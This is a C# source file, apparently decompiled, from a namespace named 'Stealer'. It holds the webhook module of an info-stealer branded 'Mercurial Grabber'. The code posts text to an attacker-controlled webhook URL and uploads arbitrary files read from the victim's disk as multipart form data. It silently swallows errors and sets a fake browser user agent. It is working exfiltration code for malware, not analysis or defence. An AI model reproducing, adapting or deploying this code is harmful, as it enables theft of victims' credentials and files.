using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;

namespace Stealer
{
	// Token: 0x02000018 RID: 24
	internal class Webhook
	{
		// Token: 0x06000066 RID: 102 RVA: 0x000053A6 File Offset: 0x000035A6
		public Webhook(string userWebhook)
		{
			this.webhook = userWebhook;
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000053B8 File Offset: 0x000035B8
		public void Send(string content)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("content", content);
			dictionary.Add("username", "Mercurial Grabber");
			dictionary.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					httpClient.PostAsync(this.webhook, new FormUrlEncodedContent(dictionary)).GetAwaiter().GetResult();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000068 RID: 104 RVA: 0x0000544C File Offset: 0x0000364C
		public void SendContent(string content)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(this.webhook);
				webRequest.ContentType = "application/json";
				webRequest.Method = "POST";
				using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
				{
					streamWriter.Write(content);
				}
				webRequest.GetResponse();
			}
			catch
			{
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000054C4 File Offset: 0x000036C4
		public void SendData(string msgBody, string filename, string filepath, string application)
		{
			FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, array.Length);
			fileStream.Close();
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add("filename", filename);
			dictionary.Add("file", new FormUpload.FileParameter(array, filename, application));
			dictionary.Add("username", "Mercurial Grabber");
			dictionary.Add("content", msgBody);
			dictionary.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
			HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(this.webhook, "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0", dictionary);
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			string str = streamReader.ReadToEnd();
			httpWebResponse.Close();
			Console.WriteLine("Response: " + str);
		}

		// Token: 0x0400005B RID: 91
		private string webhook;
	}
}
